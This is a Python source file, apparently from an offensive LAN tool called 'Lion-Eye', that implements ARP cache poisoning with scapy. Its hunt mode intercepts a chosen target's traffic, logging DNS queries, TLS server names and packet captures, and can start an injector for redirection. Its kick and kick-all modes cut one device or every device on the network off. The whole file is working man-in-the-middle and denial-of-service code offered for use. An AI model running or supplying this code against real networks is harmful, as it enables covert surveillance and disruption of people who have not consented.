import threading
import time
import socket
import subprocess
from collections import Counter
from scapy.all import ARP, Ether, sendp, srp, sniff, IP, TCP, UDP, wrpcap, DNS, DNSQR, load_layer

try:
    load_layer("tls")
except Exception:
    pass

from tabulate import tabulate
from colorama import Fore, Style

from .config import PORT_MAP, THEME, KNOWN_SERVICES
from .l7_parser import L7Analyzer
from .device_profiler import DeviceProfiler
from .injector import LionInjector
from utils.helpers import print_info, print_success, print_error, print_warning, get_device_name


class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip, output_file=None, message=None, redirect_url=None, dns_map=None):
        self.interface   = interface
        self.target_ip   = target_ip
        self.gateway_ip  = gateway_ip
        self.clients     = []
        self._stop_event = threading.Event()
        self.output_file = output_file
        self.message = message
        self.redirect_url = redirect_url
        self.dns_map = dns_map
        self.is_ghost_mode = False
        self.injector = None
        self.captured_packets = []
        self.domain_map = {}  # Cache for IP -> Domain mappings from DNS/SNI
        self.l7_analyzer = L7Analyzer() # Media Extractor & Injection helper
        self.profiler = None  # Initialized when target MAC is resolved
        self.text_log_file = "lion_eye_activity.txt"
        
        # Initialize text log with a header
        with open(self.text_log_file, "a") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"SESSION START: {time.ctime()}\n")
            f.write(f"TARGET: {self.target_ip} | GATEWAY: {self.gateway_ip}\n")
            f.write(f"{'='*60}\n")

        # Resolved MAC cache (populated once at start for spoof/restore)
        self._mac_cache  = {}
        self._hostname_cache = {}

        # ── Hunt-mode settings (set before calling hunt()) ────
        self.filter_only    = None   # e.g. "HTTPS" — show ONLY this service
        self.filter_ignore  = set()  # e.g. {"DNS"} — hide these services

    # ══════════════════════════════════════════════════════════
    # Helpers
    # ══════════════════════════════════════════════════════════

    def get_mac(self, ip):
        """Resolve IP → MAC via ARP.  Caches results."""
        if ip in self._mac_cache:
            return self._mac_cache[ip]
        try:
            answered = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2, verbose=False, iface=self.interface
            )[0]
            if answered:
                mac = answered[0][1].hwsrc
                self._mac_cache[ip] = mac
                return mac
        except PermissionError:
            print_error("Permission denied. Run with sudo.")
        except Exception as e:
            print_error(f"Error getting MAC for {ip}: {e}")
        return None

    def _resolve(self, ip):
        """Advanced device/domain name resolution with cache."""
        if ip in self._hostname_cache:
            return self._hostname_cache[ip]
        
        # Check domain map first (from DNS/SNI)
        if ip in self.domain_map:
            return self.domain_map[ip]
            
        name = get_device_name(ip)
        self._hostname_cache[ip] = name
        return name

    # ══════════════════════════════════════════════════════════
    # ARP poisoning  (uses Ether dst = real MAC → no Scapy warning)
    # ══════════════════════════════════════════════════════════

    def _spoof(self, target_ip, spoof_ip):
        """Send a forged ARP is-at to *target_ip* claiming we are *spoof_ip*."""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            return False
        pkt = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
        )
        sendp(pkt, verbose=False, iface=self.interface)
        return True

    def _restore(self, dst_ip, src_ip):
        """Send correct ARP responses to undo the poisoning."""
        dst_mac = self.get_mac(dst_ip)
        src_mac = self.get_mac(src_ip)
        if dst_mac and src_mac:
            pkt = Ether(dst=dst_mac) / ARP(
                op=2, pdst=dst_ip, hwdst=dst_mac,
                psrc=src_ip, hwsrc=src_mac
            )
            sendp(pkt, count=6, verbose=False, iface=self.interface)

    def _poison_loop(self):
        """Background daemon: continuously re-poison target ↔ gateway."""
        sent = 0
        while not self._stop_event.is_set():
            ok1 = self._spoof(self.target_ip, self.gateway_ip)
            ok2 = self._spoof(self.gateway_ip, self.target_ip)
            if ok1 and ok2:
                sent += 2
            self._stop_event.wait(2)  # interruptible sleep

    # ══════════════════════════════════════════════════════════
    # Summary helpers
    # ══════════════════════════════════════════════════════════

    @staticmethod
    def _bar(fraction, width=20):
        """Render a tiny bar-chart segment."""
        filled = int(fraction * width)
        return "█" * filled + "░" * (width - filled)

    def _render_summary(self, rows, total):
        """Return a multi-line string with Top-5 Hosts + Protocol Distribution."""
        if not rows:
            return ""

        lines = []

        # ── Top 5 Targeted Hosts ──────────────────────────────
        host_counter = Counter()
        for r in rows:
            # Determine remote host (the one that is NOT the target)
            remote = r[1] if r[0] == self.target_ip or r[0] == self._resolve(self.target_ip) else r[0]
            host_counter[remote] += 1

        lines.append(f"  {Fore.MAGENTA}{Style.BRIGHT}┌─── Top 5 Targeted Hosts ──────────────────────────────────────┐{Style.RESET_ALL}")
        for rank, (host, count) in enumerate(host_counter.most_common(5), 1):
            pct = count / total * 100
            bar = self._bar(count / total)
            # Truncate long hostnames
            display = (host[:42] + "…") if len(host) > 43 else host
            lines.append(
                f"  {Fore.MAGENTA}│{Style.RESET_ALL}  {Fore.WHITE}{rank}. {display:<44s}{Style.RESET_ALL}"
                f" {bar}  {Fore.CYAN}{count:>5}{Style.RESET_ALL} ({pct:4.1f}%)  {Fore.MAGENTA}│{Style.RESET_ALL}"
            )
        lines.append(f"  {Fore.MAGENTA}{Style.BRIGHT}└───────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")

        # ── Protocol Distribution ─────────────────────────────
        proto_counter = Counter(r[2] for r in rows)
        lines.append(f"  {Fore.YELLOW}{Style.BRIGHT}┌─── Protocol Distribution ─────────────────────────────────────┐{Style.RESET_ALL}")
        for proto, count in proto_counter.most_common():
            pct = count / total * 100
            bar = self._bar(count / total)
            lines.append(
                f"  {Fore.YELLOW}│{Style.RESET_ALL}  {Fore.WHITE}{proto:<10s}{Style.RESET_ALL}"
                f" {bar}  {Fore.CYAN}{count:>5}{Style.RESET_ALL} ({pct:4.1f}%)  {Fore.YELLOW}│{Style.RESET_ALL}"
            )
        lines.append(f"  {Fore.YELLOW}{Style.BRIGHT}└───────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")

        return "\n".join(lines)

    # ══════════════════════════════════════════════════════════
    # Color-coded row formatter
    # ══════════════════════════════════════════════════════════

    def _colorize_row(self, row):
        """
        Return a copy of [src, dst, proto, service, length] with ANSI colors:
          • DNS       → Yellow
          • HTTP / plaintext (FTP, TELNET, SMTP) → Red
          • Payload > 1000 bytes → Blue
          • Default   → no extra color
        """
        src, dst, proto, service, length = row

        # Determine row color
        if service == "DNS":
            c = Fore.YELLOW
        elif service in ("HTTP", "FTP", "FTP-DATA", "TELNET", "SMTP", "POP3"):
            c = Fore.RED
        elif length > 1000:
            c = Fore.BLUE
        else:
            c = ""

        if c:
            return [f"{c}{src}{Style.RESET_ALL}",
                    f"{c}{dst}{Style.RESET_ALL}",
                    f"{c}{proto}{Style.RESET_ALL}",
                    f"{c}{service}{Style.RESET_ALL}",
                    f"{c}{length}{Style.RESET_ALL}"]
        return row

    # ══════════════════════════════════════════════════════════
    # Live packet sniffer  (main thread during hunt)
    # ══════════════════════════════════════════════════════════

    def _sniff_packets(self):
        """Capture packets flowing through us and update data for the UI thread."""
        self._all_rows    = []
        self._display_rows = []
        self._last_update  = time.time()

        def handler(pkt):
            if IP not in pkt:
                return

            src = pkt[IP].src
            dst = pkt[IP].dst

            # Only packets involving target
            if src != self.target_ip and dst != self.target_ip:
                return

            # Save packet for PCAP export
            self.captured_packets.append(pkt)

            proto   = "OTHER"
            service = "OTHER"

            if TCP in pkt:
                proto   = "TCP"
                sport, dport = pkt[TCP].sport, pkt[TCP].dport
                service = PORT_MAP.get(dport, PORT_MAP.get(sport, "TCP-OTHER"))
            elif UDP in pkt:
                proto   = "UDP"
                sport, dport = pkt[UDP].sport, pkt[UDP].dport
                service = PORT_MAP.get(dport, PORT_MAP.get(sport, "UDP-OTHER"))

            src_name = self._resolve(src)
            dst_name = self._resolve(dst)
            length   = len(pkt)

            # Feed data to the Device Profiler
            ttl_val = pkt[IP].ttl if src == self.target_ip else None
            port_val = None
            if TCP in pkt:
                port_val = pkt[TCP].dport if src == self.target_ip else pkt[TCP].sport
            elif UDP in pkt:
                port_val = pkt[UDP].dport if src == self.target_ip else pkt[UDP].sport
            if self.profiler:
                payload_val = pkt[Raw].load if Raw in pkt else None
                self.profiler.feed(src, dst, service, length, dst_name, port=port_val, ttl=ttl_val, payload=payload_val)

            # DNS/SNI resolution
            if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                try:
                    qname = pkt.getlayer(DNS).qd.qname.decode().strip('.')
                    # Log query if needed
                except: pass

            if pkt.haslayer(TCP) and pkt[TCP].dport == 443:
                try:
                    if pkt.haslayer(TLS) and hasattr(pkt[TLS], 'msg'):
                        for msg in pkt[TLS].msg:
                            if hasattr(msg, 'ext'):
                                for ext in msg.ext:
                                    if ext.type == 0:
                                        server_name = ext.servernames[0].servername.decode()
                                        self.domain_map[dst] = server_name
                                        dst_name = server_name
                except: pass

            # ── 3. L7 Deep Analysis (Media & Injection) ──────
            self.l7_analyzer.process_packet(pkt)

            # ── 4. Cross-Platform Text Logging ───────────────
            with open(self.text_log_file, "a") as f:
                timestamp = time.strftime("%H:%M:%S")
                log_entry = f"[{timestamp}] {src_name} -> {dst_name} ({service}) [{length} bytes]\n"
                f.write(log_entry)

            row = [src_name, dst_name, proto, service, length]
            self._all_rows.append(row)

            # ── 5. Simplified Filter for Live Display ────────
            # Only show "Interesting" packets in the live table to keep it clean
            interesting_services = ["DNS", "HTTP", "HTTPS", "IMAPS", "SMTP"]
            is_interesting = service in interesting_services or length > 1000

            if is_interesting:
                if self.filter_only and service != self.filter_only:
                    return
                if service in self.filter_ignore:
                    return
                self._display_rows.append(row)
                # Keep latest 50 interesting events in memory
                if len(self._display_rows) > 50:
                    self._display_rows.pop(0)

        # Start the UI rendering thread
        ui_thread = threading.Thread(target=self._ui_loop, daemon=True)
        ui_thread.start()

        try:
            sniff(
                iface=self.interface,
                prn=handler,
                stop_filter=lambda _: self._stop_event.is_set()
            )
        except Exception:
            pass

    def _ui_loop(self):
        """Separate thread: updates the terminal display with a live, focused look."""
        while not self._stop_event.is_set():
            if not hasattr(self, '_all_rows') or not self._all_rows:
                time.sleep(0.5)
                continue

            print("\033[2J\033[H", end="")  # clear terminal

            if self.is_ghost_mode:
                print(f"  {Fore.RED}{Style.BRIGHT}👻 LION-EYE GHOST MODE{Style.RESET_ALL}")
                print(f"  {Fore.WHITE}Monitoring: {Fore.YELLOW}{self.target_ip}{Style.RESET_ALL}\n")
                if self.profiler:
                    print(self.profiler.render_card())
                    print()
                print(f"  {Fore.YELLOW}Press CTRL+C to stop and restore network{Style.RESET_ALL}")
            else:
                print(f"  {Fore.CYAN}{Style.BRIGHT}🦁 LION-EYE FOCUS MODE{Style.RESET_ALL}")
                print(f"  {Fore.WHITE}Monitoring: {Fore.YELLOW}{self.target_ip}{Style.RESET_ALL}\n")

                if self.profiler:
                    print(self.profiler.render_card())
                    print()

                total = len(self._all_rows)
                print(f"  {Fore.WHITE}Activity Summary ({total} total packets intercepted):{Style.RESET_ALL}")

                if self._display_rows:
                    print(f"  {Fore.GREEN}Recent Significant Activity:{Style.RESET_ALL}")
                    colored = [self._colorize_row(r) for r in self._display_rows[-8:]]
                    print(tabulate(
                        colored,
                        headers=["Source", "Destination", "Proto", "Service", "Bytes"],
                        tablefmt="fancy_grid"
                    ))
                else:
                    print(f"  {Fore.YELLOW}Waiting for interesting traffic (DNS/HTTPS/HTTP)...{Style.RESET_ALL}")

                print(f"\n  {Fore.WHITE}Press {Fore.RED}CTRL+C{Fore.WHITE} to stop. Logs: {Fore.CYAN}{self.text_log_file}{Style.RESET_ALL}")

            time.sleep(0.8)


    # ══════════════════════════════════════════════════════════
    # Public: classic start (no sniffing)
    # ══════════════════════════════════════════════════════════

    def start(self):
        print_info(f"Setting up ARP Spoofing on {self.interface}...")
        print_info(f"Target IP : {self.target_ip}")
        print_info(f"Gateway IP: {self.gateway_ip}")

        if not self.get_mac(self.target_ip) or not self.get_mac(self.gateway_ip):
            print_error("Could not resolve MAC addresses. Exiting...")
            return

        print_success("MAC addresses resolved.")
        print_warning("Starting spoofing. Press CTRL+C to stop and restore network.\n")

        sent = 0
        try:
            while True:
                if self._spoof(self.target_ip, self.gateway_ip) and self._spoof(self.gateway_ip, self.target_ip):
                    sent += 2
                    print(f"\r[+] Sent {sent} packets", end="", flush=True)
                time.sleep(2)
        except KeyboardInterrupt:
            print_info("\nRestoring network state...")
            self._restore(self.target_ip, self.gateway_ip)
            self._restore(self.gateway_ip, self.target_ip)
            print_success("Network restored.")

    # ══════════════════════════════════════════════════════════
    # Public: hunt mode  (spoofing + live dashboard)
    # ══════════════════════════════════════════════════════════

    def ghost_mode(self):
        """Minimal UI for stealthy redirection and intelligence only."""
        self.is_ghost_mode = True
        self.hunt()

    def hunt(self):
        """
        ARP-spoof the target and show intercepted traffic in a rich,
        colour-coded, summary-driven live dashboard.
        """
        print_info(f"Resolving MACs for target ({self.target_ip}) and gateway ({self.gateway_ip})...")

        target_mac  = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)

        if not target_mac or not gateway_mac:
            print_error("Could not resolve one or both MAC addresses. Aborting.")
            return

        print_success(f"Target MAC  : {target_mac}")
        print_success(f"Gateway MAC : {gateway_mac}")

        # Initialize the AI Device Profiler
        self.profiler = DeviceProfiler(self.target_ip, target_mac)

        if self.filter_only:
            print_info(f"Capture filter: ONLY {self.filter_only}")
        if self.filter_ignore:
            print_info(f"Capture filter: IGNORING {', '.join(sorted(self.filter_ignore))}")

        print_warning("Starting ARP poisoning + live packet capture...")
        print_warning("Press CTRL+C at any time to stop and restore network.\n")

        # 1. Enable IP forwarding and setup iptables rules
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, capture_output=True)
            subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface, "-j", "ACCEPT"], check=True)
            subprocess.run(["iptables", "-A", "FORWARD", "-o", self.interface, "-j", "ACCEPT"], check=True)
            print_info("IP forwarding and iptables rules enabled.")
        except Exception as e:
            print_warning(f"Could not fully configure forwarding: {e}")
        # ── Start Lion-Injector (Redirector) ─────────────────
        if self.message or self.redirect_url or self.dns_map:
            self.injector = LionInjector(self.interface, self.target_ip, self.dns_map, profiler=self.profiler)
            self.injector.start()

        # Daemon thread for continuous ARP poisoning
        poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        poison_thread.start()

        try:
            self._sniff_packets()
        except KeyboardInterrupt:
            pass
        finally:
            self._stop_event.set()
            print_info("\nRestoring network state. Please wait...")
            if self.injector:
                self.injector.stop()
            self._restore(self.target_ip, self.gateway_ip)
            self._restore(self.gateway_ip, self.target_ip)
            
            if self.output_file and self.captured_packets:
                print_info(f"Saving {len(self.captured_packets)} packets to {self.output_file}...")
                try:
                    wrpcap(self.output_file, self.captured_packets)
                    print_success(f"Capture saved successfully.")
                except Exception as e:
                    print_error(f"Failed to save PCAP: {e}")
            
            print_success("Network restored successfully.")

            # Disable IP forwarding and surgically remove iptables rules
            try:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True, capture_output=True)
                subprocess.run(["iptables", "-D", "FORWARD", "-i", self.interface, "-j", "ACCEPT"], capture_output=True)
                subprocess.run(["iptables", "-D", "FORWARD", "-o", self.interface, "-j", "ACCEPT"], capture_output=True)
                print_info("IP forwarding and iptables rules disabled.")
            except Exception:
                pass
    # ══════════════════════════════════════════════════════════
    # Public: kick mode  (disconnect target from internet)
    # ══════════════════════════════════════════════════════════

    def kick(self):
        """
        ARP-spoof the target and gateway but DISABLE IP forwarding 
        to effectively drop all their traffic.
        """
        print_info(f"Preparing to kick {self.target_ip} off the network...")

        target_mac  = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)

        if not target_mac or not gateway_mac:
            print_error("Could not resolve MAC addresses. Aborting.")
            return

        print_success(f"Target MAC  : {target_mac}")
        print_success(f"Gateway MAC : {gateway_mac}")

        # Disable IP forwarding to "kill" the connection
        try:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=0"],
                check=True, capture_output=True
            )
            print_info("IP forwarding disabled (Traffic will be dropped).")
        except Exception:
            print_warning("Could not explicitly disable IP forwarding. Ensure it is off manually.")

        print_warning(f"{Fore.RED}{Style.BRIGHT}KICKING {self.target_ip} ...{Style.RESET_ALL}")
        print_warning("Target device will lose all internet/network access.")
        print_warning("Press CTRL+C to stop and restore their connection.\n")

        # Launch poison thread
        poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        poison_thread.start()

        try:
            # Display a simple status screen
            while True:
                print("\033[2J\033[H", end="")
                print(f"  {Fore.RED}{Style.BRIGHT}╔════ LION-EYE KICKER ══════════════════════════════════╗{Style.RESET_ALL}")
                print(f"  {Fore.RED}║{Style.RESET_ALL}  STATUS  : {Fore.RED}{Style.BRIGHT}DISCONNECTED{Style.RESET_ALL}{' ' * 27}{Fore.RED}║{Style.RESET_ALL}")
                print(f"  {Fore.RED}║{Style.RESET_ALL}  TARGET  : {Fore.WHITE}{self.target_ip:<36}{Style.RESET_ALL}{Fore.RED}║{Style.RESET_ALL}")
                print(f"  {Fore.RED}║{Style.RESET_ALL}  HOSTNAME: {Fore.WHITE}{self._resolve(self.target_ip):<36}{Style.RESET_ALL}{Fore.RED}║{Style.RESET_ALL}")
                print(f"  {Fore.RED}╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                print(f"\n  [!] Poisoning active. Packets from {self.target_ip} are being dropped.")
                print(f"  Press {Fore.YELLOW}CTRL+C{Style.RESET_ALL} to reconnect the target.")
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self._stop_event.set()
            print_info("\nRestoring target's network connection. Please wait...")
            self._restore(self.target_ip, self.gateway_ip)
            self._restore(self.gateway_ip, self.target_ip)
            print_success("Target reconnected successfully.")

    def kick_all(self, clients):
        """
        ARP-spoof EVERYONE on the network (except gateway and self) 
        and DISABLE IP forwarding to drop their traffic.
        """
        self.clients = clients
        print_info(f"⚡ Initializing ARP Killer (The Silent Shout) for {len(clients)} devices...")

        # Show the list of devices that will be cut off
        table = [[i+1, c['ip'], c.get('name', ''), c['mac']]
                 for i, c in enumerate(self.clients) if c['ip'] != self.gateway_ip]
        print_success("⚡ Devices that will be disconnected:")
        print(tabulate(table, headers=["#", "IP", "Hostname", "MAC"], tablefmt="fancy_grid"))

        # Disable IP forwarding globally to drop intercepted traffic
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True, capture_output=True)
            print_info("IP forwarding disabled. Only this device will have internet.")
        except Exception:
            print_warning("Could not disable IP forwarding automatically.")

        print_warning(f"\n{Fore.RED}{Style.BRIGHT}!!! KILLING ALL CONNECTIONS !!!{Style.RESET_ALL}")
        print_warning("Press CTRL+C to stop and restore network for everyone.\n")


        # Start the "Kill All" poison loop
        killer_thread = threading.Thread(target=self._poison_all_loop, daemon=True)
        killer_thread.start()

        try:
            while True:
                print("\033[2J\033[H", end="")
                print(f"  {Fore.RED}{Style.BRIGHT}╔════ LION-EYE ARP KILLER (SILENT SHOUT) ═══════════════╗{Style.RESET_ALL}")
                print(f"  {Fore.RED}║{Style.RESET_ALL}  STATUS   : {Fore.RED}{Style.BRIGHT}STORMING NETWORK 🌪️{Style.RESET_ALL}{' ' * 19}{Fore.RED}║{Style.RESET_ALL}")
                print(f"  {Fore.RED}║{Style.RESET_ALL}  DEVICES  : {Fore.WHITE}{len(self.clients):<38}{Style.RESET_ALL}{Fore.RED}║{Style.RESET_ALL}")
                print(f"  {Fore.RED}║{Style.RESET_ALL}  INTERNET : {Fore.GREEN}{Style.BRIGHT}ON (ONLY YOU){Style.RESET_ALL}{' ' * 24}{Fore.RED}║{Style.RESET_ALL}")
                print(f"  {Fore.RED}╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                
                print(f"\n  [!] Poisoning {len(self.clients)} targets. All their traffic is being dropped.")
                print(f"  [+] Your internet remains active.")
                print(f"  Press {Fore.YELLOW}CTRL+C{Style.RESET_ALL} to {Fore.GREEN}Self-Heal{Style.RESET_ALL} the network.")
                time.sleep(1.5)
        except KeyboardInterrupt:
            pass
        finally:
            self._stop_event.set()
            print_info("\n🛡️  Initiating Self-Heal... Restoring network for all devices.")
            for c in self.clients:
                if c['ip'] != self.gateway_ip:
                    self._restore(c['ip'], self.gateway_ip)
                    self._restore(self.gateway_ip, c['ip'])
            print_success("✅ Network healed. Everyone is back online.")

    def _poison_all_loop(self):
        """Continuously spoof every client in the list."""
        while not self._stop_event.is_set():
            for c in self.clients:
                if c['ip'] != self.gateway_ip:
                    # Tell target we are gateway
                    self._spoof(c['ip'], self.gateway_ip)
                    # Optional: Tell gateway we are target (to drop incoming too)
                    self._spoof(self.gateway_ip, c['ip'])
            time.sleep(2)

